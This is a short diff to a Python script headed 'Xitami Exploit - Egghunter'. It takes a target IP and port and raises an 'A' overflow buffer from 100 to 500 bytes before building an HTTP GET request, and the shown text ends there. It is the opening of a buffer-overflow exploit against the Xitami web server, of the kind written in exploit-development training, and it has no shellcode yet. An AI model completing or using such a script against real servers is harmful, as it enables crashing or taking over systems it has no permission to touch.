@@ -1,6 +1,13 @@
-import time
+#!/usr/bin/python
 import socket
-import sys
+import time
+import sys 
+
+banner = """
+#----------------------------------------------#
+Xitami Exploit - Egghunter
+#----------------------------------------------#
+"""
 
 if len(sys.argv) != 3:
     print "Usage: ./xitami.py <Target IP> <Target Port>"
@@ -8,8 +15,8 @@ if len(sys.argv) != 3:
 
 target = sys.argv[1]
 port = int(sys.argv[2])
-
-buf = "A" * 100
+ 
+buf = "A"*500
 
 header = (
 'GET / HTTP/1.1\r\n'
